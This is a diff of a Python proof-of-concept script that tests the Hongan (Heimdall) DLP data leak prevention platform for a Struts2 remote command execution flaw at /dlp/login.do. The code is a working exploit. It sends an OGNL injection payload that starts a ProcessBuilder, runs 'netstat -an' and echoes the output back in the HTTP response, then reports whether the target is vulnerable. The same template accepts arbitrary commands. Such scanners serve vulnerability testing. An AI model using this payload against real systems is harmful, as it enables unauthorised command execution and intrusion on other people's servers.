@@ -9,20 +9,13 @@ description: oshadan "Heimdall DLP数据泄漏防护系统" /dlp/login.do存在s
 import sys
 import requests
 import warnings
-
-  
-
-class hongan_dlp_struts_exec:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['虹安DLP数据泄露防护平台struts2远程命令执行','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/dlp/login.do?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"Active Internet connections" in req.text:
@@ -39,8 +32,6 @@ class hongan_dlp_struts_exec:
                 result[2] ='可能存在'
                 result[1] = vulnurl
                 return result
-
-
             else:
                 result[2]=  '不存在'
 
@@ -50,5 +41,4 @@ class hongan_dlp_struts_exec:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = hongan_dlp_struts_exec(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
